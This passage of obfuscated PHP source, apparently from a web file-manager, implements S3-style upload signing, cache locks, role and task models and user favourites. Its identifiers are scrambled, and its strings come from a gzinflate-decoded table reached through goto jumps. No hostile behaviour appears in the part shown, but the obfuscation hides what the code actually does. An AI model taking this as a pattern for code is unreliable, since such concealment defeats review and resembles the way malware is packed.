$¡ÑõÚ‡Æ = implode($â™ßÆó[8], $¥éò«ªá); $™ÉœËâ˜ = array($â™ßÆó[252] => gmdate($â™ßÆó[1354], strtotime($â™ßÆó[254])), $â™ßÆó[255] => array(array($â™ßÆó[256] => $this->bucket), array($â™ßÆó[257] => $‡š¦Ë¼«), array($â™ßÆó[258], $â™ßÆó[259], $â™ßÆó[12]), array($â™ßÆó[258], $â™ßÆó[260], $â™ßÆó[12]), array($â™ßÆó[258], $â™ßÆó[261], $â™ßÆó[12]), array($â™ßÆó[262] => $“éŞ©), array($â™ßÆó[263] => $¡ÑõÚ‡Æ), array($â™ßÆó[264] => $ÛåŒ³Ö), array($â™ßÆó[265] => $Ë»òÛ), array($â™ßÆó[266] => $ËïÌôØ°))); $–ö®ò¸ = base64_encode(json_encode($™ÉœËâ˜)); $½ØÃÇ× = hash_hmac($â™ßÆó[267], $Œ§Û½ÅÂ, $â™ßÆó[268] . $this->secret, !0); $—ÜŠ²À© = hash_hmac($â™ßÆó[267], $this->region, $½ØÃÇ×, !0); $¡üâş¬É = hash_hmac($â™ßÆó[267], $¡÷¤¦ê, $—ÜŠ²À©, !0); $ÆëŒªºŒ = hash_hmac($â™ßÆó[267], $ÓÃ¬”•ˆ, $¡üâş¬É, !0); $±¾êó× = hash_hmac($â™ßÆó[267], $–ö®ò¸, $ÆëŒªºŒ); $íºæùå” = array($â™ßÆó[225] => $â™ßÆó[12], $â™ßÆó[269] => $â™ßÆó[12], $â™ßÆó[257] => $‡š¦Ë¼«, $â™ßÆó[262] => $“éŞ©, $â™ßÆó[270] => $–ö®ò¸, $â™ßÆó[271] => $¡ÑõÚ‡Æ, $â™ßÆó[272] => $ÛåŒ³Ö, $â™ßÆó[273] => $Ë»òÛ, $â™ßÆó[274] => $ËïÌôØ°, $â™ßÆó[275] => $±¾êó×, $â™ßÆó[182] => $this->getHost()); return $íºæùå”; } public function multiUploadFormData($»§×¦ÀÀ, $›Ûˆ£ú× = 3600) { $Ü´ÉÆ¢Ü =& $_SERVER[”ú…±Ú¥]; $ıäûöøŒ = gmdate($Ü´ÉÆ¢Ü[1457]); $ŸÂ¶ú® = array(); $Å°øëöé = $this->client->getUploadId($this->bucket, $»§×¦ÀÀ, $ŸÂ¶ú®); if (!$Å°øëöé) { return !1; } return array($Ü´ÉÆ¢Ü[233] => $Å°øëöé, $Ü´ÉÆ¢Ü[182] => $this->getHost() . $Ü´ÉÆ¢Ü[8] . $this->pathEncode($»§×¦ÀÀ), $Ü´ÉÆ¢Ü[234] => $ıäûöøŒ, $Ü´ÉÆ¢Ü[94] => $»§×¦ÀÀ); } public function multiUploadAuthData($ÒÅòÎîû, $ÙÖ—¬Ô = array()) { $°£Ã³ÔÃ =& $_SERVER[”ú…±Ú¥]; $©¥­øğ‘ = isset($ÙÖ—¬Ô[$°£Ã³ÔÃ[174]]) ? $ÙÖ—¬Ô[$°£Ã³ÔÃ[174]] : $°£Ã³ÔÃ[12]; $á¯–…Š¡ = $ÙÖ—¬Ô[$°£Ã³ÔÃ[94]]; unset($ÙÖ—¬Ô[$°£Ã³ÔÃ[94]]); if (isset($ÙÖ—¬Ô[$°£Ã³ÔÃ[235]])) { return $this->listUploadParts($á¯–…Š¡, $ÙÖ—¬Ô); } $¶ÂÏê½ = array(); if (isset($ÙÖ—¬Ô[$°£Ã³ÔÃ[1458]])) { $¶ÂÏê½[$°£Ã³ÔÃ[1459]] = $ÙÖ—¬Ô[$°£Ã³ÔÃ[1458]]; } $Æùş†³¯ = explode($°£Ã³ÔÃ[184], $this->getHost()); $Ä£›ù»” = array($°£Ã³ÔÃ[1460] => $Æùş†³¯[1], $°£Ã³ÔÃ[1461] => $°£Ã³ÔÃ[12], $°£Ã³ÔÃ[225] => $°£Ã³ÔÃ[120], $°£Ã³ÔÃ[269] => $ÙÖ—¬Ô[$°£Ã³ÔÃ[76]]); $´õÉ“Æ„ = $°£Ã³ÔÃ[238]; $ÜùÛ¤ÏÁ = $°£Ã³ÔÃ[8] . $this->pathEncode($á¯–…Š¡) . $©¥­øğ‘; $ì‚¤ÖÔÍ = $this->client->__getSignatureV4($¶ÂÏê½, $Ä£›ù»”, $´õÉ“Æ„, $ÜùÛ¤ÏÁ); if (strpos($©¥­øğ‘, $°£Ã³ÔÃ[237]) === 0) { if (isset($¶ÂÏê½[$°£Ã³ÔÃ[1459]])) { $ƒÚ”ç = $¶ÂÏê½[$°£Ã³ÔÃ[1459]]; } else { if (isset($ì‚¤ÖÔÍ[$°£Ã³ÔÃ[1459]])) { $ƒÚ”ç = $ì‚¤ÖÔÍ[$°£Ã³ÔÃ[1459]]; } else { $ƒÚ”ç = hash($°£Ã³ÔÃ[267], $°£Ã³ÔÃ[12]); } } return array($°£Ã³ÔÃ[243] => $ì‚¤ÖÔÍ[$°£Ã³ÔÃ[243]], $°£Ã³ÔÃ[1459] => $ƒÚ”ç, $°£Ã³ÔÃ[234] => $ì‚¤ÖÔÍ[$°£Ã³ÔÃ[1462]]); } return $ì‚¤ÖÔÍ[$°£Ã³ÔÃ[243]]; } public function listUploadParts($º£¼ƒÂ‘, $âáØˆÍâ = array()) { $…‰ÄÌÆ =& $_SERVER[”ú…±Ú¥]; $¹¿ï­ÓÂ = str_replace($…‰ÄÌÆ[244], $…‰ÄÌÆ[12], $âáØˆÍâ[$…‰ÄÌÆ[174]]); $¹²Ò˜É¦ = $this->client->listParts($this->bucket, $º£¼ƒÂ‘, $¹¿ï­ÓÂ); if (!$¹²Ò˜É¦) { return !1; } $îàÌÔß = $…‰ÄÌÆ[1463]; foreach ($¹²Ò˜É¦ as $†ï–Ï×„) { $îàÌÔß .= $…‰ÄÌÆ[1464] . "\74\120\x61\x72\x74\116\x75\x6d\x62\145\x72\76{$†ï–Ï×„[$…‰ÄÌÆ[1418]]}\x3c\57\120\141\x72\164\x4e\165\x6d\x62\145\162\x3e\xa" . "\x3c\105\x54\x61\147\x3e{$†ï–Ï×„[$…‰ÄÌÆ[1419]]}\74\57\105\124\x61\147\x3e\xa" . $…‰ÄÌÆ[1465]; } $îàÌÔß .= $…‰ÄÌÆ[1466]; $¿»­¥Âü = array(); $¨™ş´€È = explode($…‰ÄÌÆ[184], $this->getHost()); $ŞİÜÊ¯¶ = array($…‰ÄÌÆ[1460] => $¨™ş´€È[1], $…‰ÄÌÆ[225] => $…‰ÄÌÆ[120], $…‰ÄÌÆ[269] => strlen($îàÌÔß)); $ˆšé•‰ğ = $…‰ÄÌÆ[236]; $ËÚÜ›¢ = $…‰ÄÌÆ[8] . $this->pathEncode($º£¼ƒÂ‘) . $âáØˆÍâ[$…‰ÄÌÆ[174]]; $°­®ûÓÉ = $this->client->__getSignatureV4($¿»­¥Âü, $ŞİÜÊ¯¶, $ˆšé•‰ğ, $ËÚÜ›¢, $îàÌÔß); return array($…‰ÄÌÆ[243] => $°­®ûÓÉ[$…‰ÄÌÆ[243]], $…‰ÄÌÆ[234] => $°­®ûÓÉ[$…‰ÄÌÆ[1462]], $…‰ÄÌÆ[245] => $¹²Ò˜É¦, $…‰ÄÌÆ[1459] => $°­®ûÓÉ[$…‰ÄÌÆ[1459]]); } public function link($ŸÃò‚³é, $°Ì³Ä¸Ô = array()) { return parent::link($ŸÃò‚³é, $°Ì³Ä¸Ô); } public function fileOut($ŸÔ»üŸ, $³¿ìÖ¹° = false, $ö¶Ü¯éÍ = false, $¾¡Ç‡Ë‰ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[”ú…±Ú¥][1467])) { return parent::fileOutServer($ŸÔ»üŸ, $³¿ìÖ¹°, $ö¶Ü¯éÍ, $¾¡Ç‡Ë‰); } parent::fileOut($ŸÔ»üŸ, $³¿ìÖ¹°, $ö¶Ü¯éÍ, $¾¡Ç‡Ë‰); } public function fileOutImage($õÊâÖè, $Æºû¥õå = 250) { if (strstr($this->endpoint, $_SERVER[”ú…±Ú¥][1467])) { return parent::fileOutImageServer($õÊâÖè, $Æºû¥õå); } parent::fileOutImage($õÊâÖè, $Æºû¥õå); } public function fileOutLink($ÌÄùıª) { $Ó¤ŠÊª² =& $_SERVER[”ú…±Ú¥]; if (substr($ÌÄùıª, 0, 7) == $Ó¤ŠÊª²[1360]) { $ÌÄùıª = $Ó¤ŠÊª²[1361] . substr($ÌÄùıª, 7); } header($Ó¤ŠÊª²[161] . $ÌÄùıª); die; } public function getHost() { $¹øõ¢ª” =& $_SERVER[”ú…±Ú¥]; $ˆÌ¬÷‘É = str_rtrim(parent::getHost(), $¹øõ¢ª”[8] . $this->bucket); $ˆÌ¬÷‘É = explode($¹øõ¢ª”[184], $ˆÌ¬÷‘É); return $ˆÌ¬÷‘É[0] . $¹øõ¢ª”[184] . $this->bucket . $¹øõ¢ª”[10] . $ˆÌ¬÷‘É[1]; } } goto eĞ£Ø’£½; cÛğ¦£‰: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ëÜï‹‡ =& $_SERVER[”ú…±Ú¥]; $ÖÆ°é¼ = $GLOBALS[$ëÜï‹‡[6]][$ëÜï‹‡[387]]; self::$cachePath = $ÖÆ°é¼[$ëÜï‹‡[210]][$ëÜï‹‡[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($½·±½§ß, $äÖ½ğöÛ = 0) { $”Ë“¡ÍÛ =& $_SERVER[”ú…±Ú¥]; $‡Æ’Àğ  = microtime(!0); $§¬Ì–Ï = $‡Æ’Àğ  + $äÖ½ğöÛ + 0.0001; $¶¾§Å¾› = rtrim(self::$cachePath, $”Ë“¡ÍÛ[8]) . $”Ë“¡ÍÛ[895] . md5($½·±½§ß) . $”Ë“¡ÍÛ[892]; if (file_exists($¶¾§Å¾›) && filemtime($¶¾§Å¾›) && filemtime($¶¾§Å¾›) < time() - 10) { @unlink($¶¾§Å¾›); } do { if (file_exists($¶¾§Å¾›)) { cacheLockWait(); continue; } $ä½´±ÚŸ = fopen($¶¾§Å¾›, $”Ë“¡ÍÛ[896]); if (!$ä½´±ÚŸ) { return !1; } $Ù××Çé = flock($ä½´±ÚŸ, LOCK_EX | LOCK_NB); self::$caches[$½·±½§ß] = array($”Ë“¡ÍÛ[897] => $ä½´±ÚŸ, $”Ë“¡ÍÛ[210] => $¶¾§Å¾›); fwrite($ä½´±ÚŸ, $§¬Ì–Ï); clearstatcache(); if ($ä½´±ÚŸ && $Ù××Çé) { return !0; } cacheLockWait(); } while (microtime(!0) < $§¬Ì–Ï); $this->unlock($½·±½§ß); return !1; } public function lockGet($ŒìË÷§Ü) { $óÌ—šŸÖ =& $_SERVER[”ú…±Ú¥]; $€ùôš = rtrim(self::$cachePath, $óÌ—šŸÖ[8]) . $óÌ—šŸÖ[895] . md5($ŒìË÷§Ü) . $óÌ—šŸÖ[892]; return file_exists($€ùôš); } public function unlock($çÒŞóå) { $“Ü¤›¾à =& $_SERVER[”ú…±Ú¥]; $Üê°ÛÚâ = self::$caches[$çÒŞóå]; if (!$Üê°ÛÚâ) { return; } @flock($Üê°ÛÚâ[$“Ü¤›¾à[897]], LOCK_UN); @fclose($Üê°ÛÚâ[$“Ü¤›¾à[897]]); @unlink($Üê°ÛÚâ[$“Ü¤›¾à[210]]); unset(self::$caches[$çÒŞóå]); } } class CacheLockRedis { public function lock($›Öø…¯‹, $²ÉÚôÔÉ = 10) { $Ø­Ş’Ü = Cache::init(); $²‹®ôñ­ = microtime(!0) + $²ÉÚôÔÉ; while (microtime(!0) < $²‹®ôñ­) { $æşáô¤ı = $Ø­Ş’Ü->get($›Öø…¯‹); if (!$æşáô¤ı) { $ŸÛ³ÌÄÚ = $Ø­Ş’Ü->setLock($›Öø…¯‹, $²‹®ôñ­, $²ÉÚôÔÉ); if ($ŸÛ³ÌÄÚ) { return !0; } } else { if ($æşáô¤ı < microtime(!0)) { $Ø­Ş’Ü->set($›Öø…¯‹, $²‹®ôñ­, $²ÉÚôÔÉ * 2); if ($Ø­Ş’Ü->get($›Öø…¯‹) === $æşáô¤ı) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($áíµí²Ğ) { return Cache::init()->get($áíµí²Ğ); } public function unlock($î– ü ) { return Cache::init()->remove($î– ü ); } } class CacheLockMemcached { public function lock($ˆÅ•Û’Û, $À€°ÃÂç = 0) { $õÖÕËØ” = Cache::init(); $Œ§¾ü°¤ = microtime(!0) + $À€°ÃÂç; while (microtime(!0) < $Œ§¾ü°¤) { $¸†ìãÍ = $õÖÕËØ”->get($ˆÅ•Û’Û); if (!$¸†ìãÍ || $¸†ìãÍ < microtime(!0)) { $§Ø÷¦³„ = $õÖÕËØ”->handle->add($ˆÅ•Û’Û, $Œ§¾ü°¤, $À€°ÃÂç); if ($§Ø÷¦³„) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÉæŸîÛÎ) { return Cache::init()->get($ÉæŸîÛÎ); } public function unlock($Ë³çö) { return Cache::init()->remove($Ë³çö); } } goto a÷“áªÊóİ; f…à¤¾¼š: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\162\x6f\154\145\x4c\151\x73\164"; public $field = array("\156\x61\155\x65", "\141\x75\x74\150", "\154\x61\142\145\154", "\x64\151\163\160\x6c\x61\x79", "\x73\171\163\x74\145\x6d", "\144\145\163\143", "\151\x67\x6e\157\162\145\x45\170\164", "\151\147\156\x6f\162\145\x46\151\154\145\x53\x69\x7a\x65", "\x61\144\x6d\x69\x6e\151\x73\x74\162\141\164\x6f\x72", "\163\x6f\x72\x74"); public function listData($¾¨•…Â = false, $õ†şÍ«í = "\x73\157\x72\164", $½ú´Ä…ü = false) { $¡Üûªå =& $_SERVER[”ú…±Ú¥]; $ô™Ç® = parent::listData($¾¨•…Â, $õ†şÍ«í, $½ú´Ä…ü); if (!$¾¨•…Â) { foreach ($ô™Ç® as $Ñ½‡’ª => $¥İé»¬) { if ($¥İé»¬[$¡Üûªå[2063]] == 1) { $ô™Ç®[$Ñ½‡’ª][$¡Üûªå[491]] = LNG($¡Üûªå[2298]); } } } return $ô™Ç®; } public function update($îŠÌ©À, $£˜…Å¦Ï) { $÷îÂå²Ô =& $_SERVER[”ú…±Ú¥]; $Í™†¼‰ = parent::listData($îŠÌ©À); $Å¿×·Ì€ = $this->findByName($£˜…Å¦Ï[$÷îÂå²Ô[32]]); if (!$Í™†¼‰ || $Å¿×·Ì€ && $Å¿×·Ì€[$÷îÂå²Ô[437]] != $Í™†¼‰[$÷îÂå²Ô[437]]) { return !1; } if ($Å¿×·Ì€[$÷îÂå²Ô[2063]] == 1) { $£˜…Å¦Ï = array($÷îÂå²Ô[32] => $£˜…Å¦Ï[$÷îÂå²Ô[32]], $÷îÂå²Ô[1884] => $£˜…Å¦Ï[$÷îÂå²Ô[1884]]); } $this->filterAuth($£˜…Å¦Ï[$÷îÂå²Ô[451]]); return parent::update($îŠÌ©À, $£˜…Å¦Ï); } public function remove($äÆëÇñ) { $¤¨â÷¨± = parent::listData($äÆëÇñ); if (!$¤¨â÷¨± || $¤¨â÷¨±[$_SERVER[”ú…±Ú¥][1316]]) { return !1; } return parent::remove($äÆëÇñ); } public function add($‰’ë£¬„) { $­êÜ¨İŸ =& $_SERVER[”ú…±Ú¥]; $†„Æ½Á = $‰’ë£¬„[$­êÜ¨İŸ[32]]; if ($this->findByName($†„Æ½Á)) { return !1; } $ÁÉ§¶†Î = array($­êÜ¨İŸ[458] => $†„Æ½Á, $­êÜ¨İŸ[1867] => $­êÜ¨İŸ[12], $­êÜ¨İŸ[1863] => $­êÜ¨İŸ[1871], $­êÜ¨İŸ[2299] => 1, $­êÜ¨İŸ[1866] => 0, $­êÜ¨İŸ[2300] => 0, $­êÜ¨İŸ[1865] => $this->getSort()); $‰’ë£¬„ = array_merge($ÁÉ§¶†Î, $‰’ë£¬„); $this->filterAuth($‰’ë£¬„[$­êÜ¨İŸ[451]]); return parent::insert($‰’ë£¬„); } private function getSort() { $î¸ÅÕ©Ê =& $_SERVER[”ú…±Ú¥]; $’Ú¾Òµ = parent::listData(); $ü‡¾«òû = array_to_keyvalue($’Ú¾Òµ, $î¸ÅÕ©Ê[12], $î¸ÅÕ©Ê[1885]); return empty($ü‡¾«òû) ? 0 : max($ü‡¾«òû) + 1; } private function filterAuth(&$ß÷ô–ƒ) { $ğ…¶ï´ =& $_SERVER[”ú…±Ú¥]; $€¹ÔÀËÎ = array(); $£°·öÒ = array_filter(explode($ğ…¶ï´[50], $ß÷ô–ƒ)); foreach ($£°·öÒ as $ß÷ô–ƒ) { $İÛÓŞ¦İ = explode($ğ…¶ï´[10], $ß÷ô–ƒ); if ($İÛÓŞ¦İ[0] == $ğ…¶ï´[2301] && $İÛÓŞ¦İ[1] != $ğ…¶ï´[1219]) { $¬ÚÂÅËÕ = $İÛÓŞ¦İ[0] . $ğ…¶ï´[10] . $İÛÓŞ¦İ[1] . $ğ…¶ï´[2302]; if (!in_array($¬ÚÂÅËÕ, $£°·öÒ)) { $€¹ÔÀËÎ[] = $¬ÚÂÅËÕ; } } $€¹ÔÀËÎ[] = $ß÷ô–ƒ; } $ß÷ô–ƒ = implode($ğ…¶ï´[50], $€¹ÔÀËÎ); } public function findRoleDefault() { $šÔ‘¯½” =& $_SERVER[”ú…±Ú¥]; $äšÊÄ‘¼ = parent::listData(); $¶ûçƒ¶© = !1; foreach ($äšÊÄ‘¼ as $áÊÄ‰´ş) { if (!$áÊÄ‰´ş || $áÊÄ‰´ş[$šÔ‘¯½”[1883]] == $šÔ‘¯½”[208] || $áÊÄ‰´ş[$šÔ‘¯½”[2063]] == 1) { continue; } if (strstr($áÊÄ‰´ş[$šÔ‘¯½”[451]], $šÔ‘¯½”[2303])) { continue; } if (!strstr($áÊÄ‰´ş[$šÔ‘¯½”[451]], $šÔ‘¯½”[2304])) { continue; } if (!$¶ûçƒ¶©) { $¶ûçƒ¶© = $áÊÄ‰´ş; continue; } $½ó×Ôõ = explode($šÔ‘¯½”[50], $¶ûçƒ¶©[$šÔ‘¯½”[451]]); $ƒŸ½¤œ¼ = explode($šÔ‘¯½”[50], $áÊÄ‰´ş[$šÔ‘¯½”[451]]); if (count($½ó×Ôõ) > count($ƒŸ½¤œ¼)) { $¶ûçƒ¶© = $áÊÄ‰´ş; } } return $¶ûçƒ¶© ? $¶ûçƒ¶©[$šÔ‘¯½”[437]] : $šÔ‘¯½”[12]; } public function sort($õÀïáÎø, $Îˆ¼ô±É) { return parent::update($õÀïáÎø, $Îˆ¼ô±É); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\164\x61\x73\x6b\114\151\163\x74"; public $field = array("\x6e\141\155\x65", "\164\171\160\x65", "\145\x76\x65\156\164", "\x74\x69\155\145", "\x64\145\163\143", "\x73\171\x73\x74\x65\155", "\x65\x6e\x61\142\154\145", "\x6c\141\163\x74\x52\x75\x6e", "\163\x6f\162\164"); public function listData($“şŠıÑÛ = false, $ï¦ØÀ”× = "\x73\x6f\x72\164", $ ¬Óìƒ = false) { return parent::listData($“şŠıÑÛ, $ï¦ØÀ”×, $ ¬Óìƒ); } public function add($’î­‘ğ) { $–ŸĞ•æ¬ =& $_SERVER[”ú…±Ú¥]; $÷æ‚›Ú = $this->findByName($’î­‘ğ[$–ŸĞ•æ¬[32]]); if ($÷æ‚›Ú) { return !1; } $’î­‘ğ[$–ŸĞ•æ¬[1631]] = 0; $’î­‘ğ[$–ŸĞ•æ¬[1885]] = $this->getSort(); return parent::insert($’î­‘ğ); } private function getSort() { $âõ¾ŒÙ© =& $_SERVER[”ú…±Ú¥]; $²Šóœ–Î = parent::listData(); $“×Ë³»Ì = array_to_keyvalue($²Šóœ–Î, $âõ¾ŒÙ©[12], $âõ¾ŒÙ©[1885]); return empty($“×Ë³»Ì) ? 0 : max($“×Ë³»Ì) + 1; } public function update($ÍË“Íî˜, $˜ô…ÃŒ) { $ÆëŞÂÃÂ =& $_SERVER[”ú…±Ú¥]; $¥ëüÆ²Ä = $this->listData($ÍË“Íî˜); $®ÄÏ³ª = $this->findByName($˜ô…ÃŒ[$ÆëŞÂÃÂ[32]]); if (!$¥ëüÆ²Ä || $®ÄÏ³ª && $®ÄÏ³ª[$ÆëŞÂÃÂ[437]] != $¥ëüÆ²Ä[$ÆëŞÂÃÂ[437]]) { return !1; } return parent::update($ÍË“Íî˜, $˜ô…ÃŒ); } public function remove($€ïò°öª, $Ğ£Ï÷È¹ = false) { $·ßşß™³ =& $_SERVER[”ú…±Ú¥]; $ºì¨ÁÑ = $this->listData($€ïò°öª); if (!$ºì¨ÁÑ) { return; } if (!$Ğ£Ï÷È¹ && $ºì¨ÁÑ[$·ßşß™³[1316]] == $·ßşß™³[88]) { return !1; } return parent::remove($€ïò°öª); } public function enable($­ÛÆ«Ú„, $´Ã¿ú†¥) { return $this->update($­ÛÆ«Ú„, array($_SERVER[”ú…±Ú¥][2293] => $´Ã¿ú†¥)); } public function run($°Üá¥óû) { return $this->update($°Üá¥óû, array($_SERVER[”ú…±Ú¥][2305] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($´’—†Œ¬) { $´Ñëº ¡ =& $_SERVER[”ú…±Ú¥]; return array($´Ñëº ¡[1972] => array(USER_ID, $´Ñëº ¡[2306])); } protected function listData() { $Òº€ˆ˜ =& $_SERVER[”ú…±Ú¥]; $’â‹ø«Ó = array($Òº€ˆ˜[1662] => USER_ID, $Òº€ˆ˜[521] => 0); $ÉÔÓôı¨ = $Òº€ˆ˜[2307]; $°Ëˆç½« = $this->field($ÉÔÓôı¨)->where($’â‹ø«Ó)->order($Òº€ˆ˜[2308])->select(); return $°Ëˆç½« ? $°Ëˆç½« : array(); } protected function resetCache() { } protected function listView() { $øËÊ³”† =& $_SERVER[”ú…±Ú¥]; $·úÄÃŒ = $this->listData(); $‡ÈÙ©£õ = array_filter_by_field($·úÄÃŒ, $øËÊ³”†[33], $øËÊ³”†[454]); $˜Ñå–›Í = array_to_keyvalue($‡ÈÙ©£õ, $øËÊ³”†[12], $øËÊ³”†[84]); if (!$˜Ñå–›Í) { return $·úÄÃŒ; } $­Ÿ­šÁ = 2000; $ÚÚ¬•» = array($øËÊ³”†[455] => array($øËÊ³”†[456], $˜Ñå–›Í)); $‘Âú¤üÖ = Model($øËÊ³”†[857])->listSource($ÚÚ¬•», $­Ÿ­šÁ); $‘Âú¤üÖ = array_merge($‘Âú¤üÖ[$øËÊ³”†[83]], $‘Âú¤üÖ[$øËÊ³”†[82]]); $‘Âú¤üÖ = array_to_keyvalue($‘Âú¤üÖ, $øËÊ³”†[440]); foreach ($·úÄÃŒ as $ïĞĞÕ´Ö => $ÌÅ»ˆ¾¶) { $—³‘³“² = $‘Âú¤üÖ[$ÌÅ»ˆ¾¶[$øËÊ³”†[84]]]; $—³‘³“² = $—³‘³“² ? $—³‘³“² : array(); $·úÄÃŒ[$ïĞĞÕ´Ö] = array_merge($—³‘³“², $ÌÅ»ˆ¾¶); } return $·úÄÃŒ; } protected function addFav($¥ëÙáì¦, $î˜œ…±€ = '', $‚«¿ãÌ = "\163\x6f\165\162\x63\145") { $û¥ªïŒ =& $_SERVER[”ú…±Ú¥]; $¹§ôÉ¿ş = array($û¥ªïŒ[1662] => USER_ID, $û¥ªïŒ[521] => 0, $û¥ªïŒ[460] => $‚«¿ãÌ, $û¥ªïŒ[459] => $¥ëÙáì¦); if ($this->where($¹§ôÉ¿ş)->find()) { return !1; } $¹§ôÉ¿ş = array($û¥ªïŒ[1662] => USER_ID, $û¥ªïŒ[521] => 0); $©Êü¬¬à = $this->where($¹§ôÉ¿ş)->max($û¥ªïŒ[1885]); if (!$©Êü¬¬à) { $©Êü¬¬à = 0; } if (!$î˜œ…±€ && $‚«¿ãÌ == $û¥ªïŒ[454]) { $“Í¤©ÊŸ = Model($û¥ªïŒ[1362])->where(array($û¥ªïŒ[455] => $¥ëÙáì¦))->find(); if (!$“Í¤©ÊŸ) { return !1; } $î˜œ…±€ = $“Í¤©ÊŸ[$û¥ªïŒ[32]]; } $î˜œ…±€ = $this->getAutoName($î˜œ…±€); $ÌÕûÅıï = array($û¥ªïŒ[1662] => USER_ID, $û¥ªïŒ[521] => 0, $û¥ªïŒ[458] => $î˜œ…±€, $û¥ªïŒ[459] => $¥ëÙáì¦, $û¥ªïŒ[460] => $‚«¿ãÌ, $û¥ªïŒ[1865] => $©Êü¬¬à + 1); return $this->add($ÌÕûÅıï); } protected function remove($ÍÍçü˜ñ) { $éÖ¥ôÅÚ =& $_SERVER[”ú…±Ú¥]; $Ø£·ü¥ş = array($éÖ¥ôÅÚ[1662] => USER_ID, $éÖ¥ôÅÚ[457] => $ÍÍçü˜ñ); return $this->where($Ø£·ü¥ş)->delete(); } protected function removeByName($µåÍ—‚) { $îæóÁ‰Ì =& $_SERVER[”ú…±Ú¥]; $‰ô¦Ğ³ = array($îæóÁ‰Ì[1662] => USER_ID, $îæóÁ‰Ì[458] => $µåÍ—‚, $îæóÁ‰Ì[521] => 0); return $this->where($‰ô¦Ğ³)->delete(); } protected function rename($†åš¬¼ø, $¹‡Ÿ¨Š) { $à’óÑ»ö =& $_SERVER[”ú…±Ú¥]; if ($†åš¬¼ø == $¹‡Ÿ¨Š) { return !1; } $»¾—ÈŸÏ = $this->getAutoName($¹‡Ÿ¨Š); if ($¹‡Ÿ¨Š != $»¾—ÈŸÏ) { return !1; } $÷ëÀ­ñ = array($à’óÑ»ö[1662] => USER_ID, $à’óÑ»ö[521] => 0, $à’óÑ»ö[32] => $†åš¬¼ø); return $this->where($÷ëÀ­ñ)->save(array($à’óÑ»ö[32] => $¹‡Ÿ¨Š)); } protected function resetSort($Ï§°¯´Ê) { $Œ¾øå”ç =& $_SERVER[”ú…±Ú¥]; $Ï§°¯´Ê = is_array($Ï§°¯´Ê) ? $Ï§°¯´Ê : array(); $ÉÁ¨ï›ã = array($Œ¾øå”ç[1662] => USER_ID); for ($ÇúÆé›´ = 0; $ÇúÆé›´ < count($Ï§°¯´Ê); $ÇúÆé›´++) { $ÉÁ¨ï›ã[$Œ¾øå”ç[457]] = $Ï§°¯´Ê[$ÇúÆé›´]; $this->where($ÉÁ¨ï›ã)->save(array($Œ¾øå”ç[1865] => $ÇúÆé›´ + 1)); } return !0; } protected function moveTop($‹¹—ÓµÃ) { $¾ğŸ¯Ûà =& $_SERVER[”ú…±Ú¥]; $å„í×è = array($¾ğŸ¯Ûà[1662] => USER_ID, $¾ğŸ¯Ûà[521] => 0); $ïƒ’¦¢× = $this->where($å„í×è)->where(array($¾ğŸ¯Ûà[32] => $‹¹—ÓµÃ))->find(); if (!$ïƒ’¦¢×) { return; } $û­ÂùâÁ = $this->field($¾ğŸ¯Ûà[437])->where($å„í×è)->order($¾ğŸ¯Ûà[2308])->select(); $û­ÂùâÁ = array_to_keyvalue($û­ÂùâÁ, $¾ğŸ¯Ûà[12], $¾ğŸ¯Ûà[437]); $—Œê›ª = $û­ÂùâÁ; $û­ÂùâÁ = array_remove_value($û­ÂùâÁ, $ïƒ’¦¢×[$¾ğŸ¯Ûà[437]]); array_unshift($û­ÂùâÁ, $ïƒ’¦¢×[$¾ğŸ¯Ûà[437]]); return $this->resetSort($û­ÂùâÁ); } protected function moveBottom($ôôçõ’³) { $š¸•üìš =& $_SERVER[”ú…±Ú¥]; $€¼–ªş = array($š¸•üìš[1662] => USER_ID, $š¸•üìš[521] => 0); $Ì”§™Œô = $this->where($€¼–ªş)->max($š¸•üìš[1885]); $¿Â—§‚ = array($š¸•üìš[1885] => $Ì”§™Œô + 1); return $this->where($€¼–ªş)->where(array($š¸•üìš[32] => $ôôçõ’³))->save($¿Â—§‚); } private function getAutoName($ñŞ¤óù) { $£–””í =& $_SERVER[”ú…±Ú¥]; $ñŞ¸ËèĞ = array($£–””í[1662] => USER_ID, $£–””í[521] => 0); $¢’Ñˆˆ‹ = $this->field($£–””í[32])->where($ñŞ¸ËèĞ)->select(); $¢’Ñˆˆ‹ = array_to_keyvalue($¢’Ñˆˆ‹, $£–””í[12], $£–””í[32]); if (!$¢’Ñˆˆ‹ || !in_array($ñŞ¤óù, $¢’Ñˆˆ‹)) { return $ñŞ¤óù; } for ($¬îŠİú– = 0; $¬îŠİú– < count($¢’Ñˆˆ‹); $¬îŠİú–++) { if (!in_array($ñŞ¤óù . "\x28{$¬îŠİú–}\x29", $¢’Ñˆˆ‹)) { return $ñŞ¤óù . "\x28{$¬îŠİú–}\51"; } } return $ñŞ¤óù . "\x28{$¬îŠİú–}\x29"; } } goto DõèÅÅ›î¿; DÓ¿í…™‹Ï: define($_SERVER[”ú…±Ú¥][0], $_SERVER[”ú…±Ú¥][1]); $_SERVER[ùÎ²ˆ•Ñ] = explode($_SERVER[”ú…±Ú¥][2], gzinflate(substr($_SERVER[”ú…±Ú¥][3], 10, -8))); function binCheckEq($ä¹è¥, $èıĞâ¹Ô) { return $ä¹è¥ == $èıĞâ¹Ô; } goto a½…Ã´´; bé¹ï Ş Ñ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($º’íÛÅŞ, $£üèÆµ÷ = '') { $this->info = $this->info($º’íÛÅŞ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[”ú…±Ú¥][84]]; $this->pathOpen = $º’íÛÅŞ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$º’íÛÅŞ])) { self::$_chunkBuffer[$º’íÛÅŞ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function 